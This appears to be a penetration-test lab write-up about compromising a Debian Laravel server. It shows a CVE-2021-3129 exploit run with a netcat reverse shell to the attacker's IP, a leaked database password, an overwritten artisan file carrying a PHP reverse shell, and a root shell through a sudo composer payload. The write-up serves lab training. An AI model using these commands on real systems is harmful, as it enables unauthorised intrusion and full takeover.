## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.147.38
# HOSTNAME                                     // Found post initial foothold
debian
# OPERATING SYSTEM                             // Found post initial foothold
cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.56 ((Debian))
```
# ENUMERATION
## PORT 80
```bash
- Registered a new user
- Found app_debug
- Set APP_DEBUG = [ENABLED]
- Found Laravel 8.4.0 on source code

- Exploit
https://github.com/0x0d3ad/CVE-2021-3129
```
## INITIAL FOOTHOLD
```bash
python3 CVE-2021-3129.py $url/ --cmd 'nc -e /bin/bash 192.168.45.152 80'
[+] Generating PHAR payload for command: nc -e /bin/bash 192.168.45.152 80
[+] Trying to clear logs
[+] Logs cleared
[+] Convert log file to PHAR
[+] Successfully converted logs to PHAR

sudo nc -nvlp 80                                                                                        
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.147.38] 51958
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```
## PRIVILEGE ESCALATION
```bash
- Run linpeas.sh

- Found /var/www/html/lavita/.env
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=lavita 
DB_USERNAME=lavita                                                                            
DB_PASSWORD=sdfquelw0kly9jgbx92

- Run pspy 
- Found
2024/12/10 07:26:01 CMD: UID=1001  PID=44837  | /usr/bin/php /var/www/html/lavita/artisan clear:pictures 

- File /var/www/html/lavita/artisan is writable by www-data 

- From kali Machine
cp /usr/share/laudanum/php/php-reverse-shell.php ./shell.php
- Edit rhost and rport
mv shell.php artisan

- Transfer to /var/www/html/lavita/artisan

listen using nc
sudo nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.147.38] 50550
Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64 GNU/Linux
 07:31:01 up  1:33,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

sudo -l
User skunk may run the following commands on debian:                                          
    (ALL : ALL) ALL                        
    (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *


# GTFOBINS - Reference
- As www-data user
www-data@debian:/var/www/html/lavita$ echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json

- As skunk user
skunk@debian:/var/www/html/lavita$ sudo /usr/bin/composer --working-dir\=/var/www/html/lavita x
Do not run Composer as root/super user! See https://getcomposer.org/root for details
Continue as root/super user [yes]? yes
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Dec 10 16:38:11 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.147.38
Nmap scan report for 192.168.147.38
Host is up, received echo-reply ttl 61 (0.040s latency).
Scanned at 2024-12-10 16:38:14 IST for 35s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNEbgprJqVJa8R95Wkbo3cemB4fdRzos+v750LtPEnRs+IJQn5jcg5l89Tx4junU+AXzLflrMVo55gbuKeNTDtFRU9ltlIu4AU+f7lRlUlvAHlNjUbU/z3WBZ5ZU9j7Xc9WKjh1Ov7chC0UnDdyr5EGrIwlLzgk8zrWx364+S4JqLtER2/n0rhVxa9RCw0tR/oL24kMep4q7rFK6dThiRtQ9nsJFhh6yw8Fmdg7r4uohqH70UJurVwVNwFqtr/86e4VSSoITlMQPZrZFVvoSsjyL8LEODt1qznoLWudMD95Eo1YFSPID5VcS0kSElfYigjSr+9bNSdlzAof1mU6xJA67BggGNu6qITWWIJySXcropehnDAt2nv4zaKAUKc/T0ij9wkIBskuXfN88cEmZbu+gObKbLgwQSRQJIpQ+B/mA8CD4AiaTmEwGSWz1dVPp5Fgb6YVy6E4oO9ASuD9Q1JWuRmnn8uiHF/nPLs2LC2+rh3nPLXlV+MG/zUfQCrdrE=
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCUhhvrIBs53SApXKZYHWBlpH50KO3POt8Y+WvTvHZ5YgRagAEU5eSnGkrnziCUvDWNShFhLHI7kQv+mx+4R6Wk=
|   256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN4MSEXnpONsc0ANUT6rFQPWsoVmRW4hrpSRq++xySM9
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.56 ((Debian))
|_http-title: W3.CSS Template
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec 10 16:38:49 2024 -- 1 IP address (1 host up) scanned in 37.97 seconds

```

